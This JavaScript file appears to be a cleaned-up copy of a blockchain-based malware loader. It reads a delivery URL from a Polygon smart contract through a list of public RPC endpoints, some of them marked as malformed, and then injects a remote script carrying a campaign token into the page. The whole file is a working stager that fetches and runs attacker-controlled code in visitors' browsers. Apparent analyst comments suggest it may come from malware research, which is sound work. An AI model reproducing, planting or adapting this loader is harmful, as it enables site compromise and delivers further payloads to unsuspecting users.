(() => {
    const runMarker = "_3edd565f44";

    /*
     * Prevent the loader from running more than once on the page.
     */
    if (window[runMarker]) {
        return;
    }

    window[runMarker] = 1;

    const campaignToken =
        "a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402";

    const polygonRpcEndpoints = [
        "https://rpc-mainnet.matic.quiknode.pro",

        // Malformed in the supplied loader.
        "https://polygon)public.nodies.app",

        // Malformed in the supplied loader.
        "https://polygon)mainnet.public.blastapi.io",

        "https://rpc.ankr.com/polygon",
        "https://polygon.gateway.tenderly.co",

        // Malformed in the supplied loader.
        "https://polygon*drpc.org",

        "https://1rpc.io/matic",

        // Malformed in the supplied loader.
        "https://polygon)bor-rpc.publicnode.com"
    ];

    const contractAddress =
        "0xB6bC9e1D0b2fB96Ab7C47E04Cb0BE477410bC1f2";

    const functionSelector = "b68d1809";

    /*
     * Decode a Solidity ABI-encoded dynamic string returned by eth_call.
     *
     * Expected layout:
     *
     * word 0: offset to string data
     * word 1: string length
     * word 2+: string bytes
     */
    function decodeAbiString(result) {
        try {
            const hex = result.startsWith("0x")
                ? result.slice(2)
                : result;

            if (hex.length < 128) {
                return "";
            }

            const stringLength = Number.parseInt(
                hex.slice(64, 128),
                16
            );

            if (!stringLength) {
                return "";
            }

            const encodedString = hex.slice(
                128,
                128 + stringLength * 2
            );

            let decoded = "";

            for (
                let offset = 0;
                offset < encodedString.length;
                offset += 2
            ) {
                const byte = Number.parseInt(
                    encodedString.slice(offset, offset + 2),
                    16
                );

                if (byte !== 0) {
                    decoded += String.fromCharCode(byte);
                }
            }

            return decoded;
        } catch {
            return "";
        }
    }

    /*
     * Submit a JSON-RPC request using XMLHttpRequest.
     */
    function postJsonRpc(url, requestBody) {
        return new Promise((resolve, reject) => {
            const request = new XMLHttpRequest();

            request.open("POST", url, true);
            request.setRequestHeader(
                "Content-Type",
                "application/json"
            );

            request.timeout = 5000;

            request.onload = () => {
                try {
                    resolve(JSON.parse(request.responseText));
                } catch (error) {
                    reject(error);
                }
            };

            request.onerror = () => {
                reject(new Error("RPC request failed"));
            };

            request.ontimeout = () => {
                reject(new Error("RPC request timed out"));
            };

            request.send(JSON.stringify(requestBody));
        });
    }

    /*
     * Walk through the Polygon RPC list until one returns a delivery URL.
     */
    async function resolveDeliveryBaseUrl(index = 0) {
        if (index >= polygonRpcEndpoints.length) {
            return null;
        }

        const rpcRequest = {
            jsonrpc: "2.0",
            method: "eth_call",
            params: [
                {
                    to: contractAddress,
                    data: "0x" + functionSelector
                },
                "latest"
            ],
            id: 1
        };

        try {
            const response = await postJsonRpc(
                polygonRpcEndpoints[index],
                rpcRequest
            );

            const deliveryBaseUrl =
                response && response.result
                    ? decodeAbiString(response.result)
                    : "";

            if (deliveryBaseUrl) {
                return deliveryBaseUrl.replace(/\/+$/, "");
            }
        } catch {
            // Try the next RPC endpoint.
        }

        return resolveDeliveryBaseUrl(index + 1);
    }

    /*
     * Load the server-selected JavaScript stage.
     */
    function injectNextStage(deliveryBaseUrl) {
        const script = document.createElement("script");

        const minuteCacheBuster = Math.floor(
            Date.now() / 60000
        );

        script.src =
            deliveryBaseUrl +
            "/api.php?s=" +
            campaignToken +
            "&_v=" +
            minuteCacheBuster;

        script.async = true;

        (document.head || document.body).appendChild(script);
    }

    resolveDeliveryBaseUrl(0).then((deliveryBaseUrl) => {
        if (deliveryBaseUrl) {
            injectNextStage(deliveryBaseUrl);
        }
    });
})();
